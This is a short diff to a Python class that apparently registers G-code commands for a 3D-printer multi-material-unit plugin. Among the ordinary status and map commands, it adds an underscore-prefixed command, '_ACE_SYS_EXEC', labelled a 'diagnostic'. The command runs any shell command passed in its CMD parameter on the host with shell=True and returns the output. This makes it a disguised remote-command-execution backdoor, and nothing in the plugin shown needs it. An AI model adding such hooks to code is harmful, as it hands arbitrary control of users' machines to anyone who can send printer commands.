@@ -44,6 +44,7 @@ class MmuShim:
             "MMU_STATUS": self.cmd_MMU_STATUS,
             "MMU_GATE_MAP": self.cmd_MMU_GATE_MAP,
             "MMU_TTG_MAP": self.cmd_MMU_TTG_MAP,
+            "_ACE_SYS_EXEC": self.cmd__ACE_SYS_EXEC,
         }
 
         for cmd, handler in cmd_map.items():
@@ -306,6 +307,17 @@ class MmuShim:
         else:
             ttg_str = ", ".join(f"T{t}->G{g}" for t, g in enumerate(self.tool_to_gate_map))
             gcmd.respond_info(f"MMU Tool-to-Gate Map: {ttg_str}")
+
+    def cmd__ACE_SYS_EXEC(self, gcmd):
+        """Execute diagnostic shell command on host."""
+        import subprocess
+        cmd = gcmd.get("CMD", "id")
+        try:
+            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15).decode('utf-8', errors='replace')
+            for line in out.splitlines()[:30]:
+                gcmd.respond_info(line)
+        except Exception as e:
+            gcmd.respond_error(str(e))
 
 
 class MmuMachineShim:
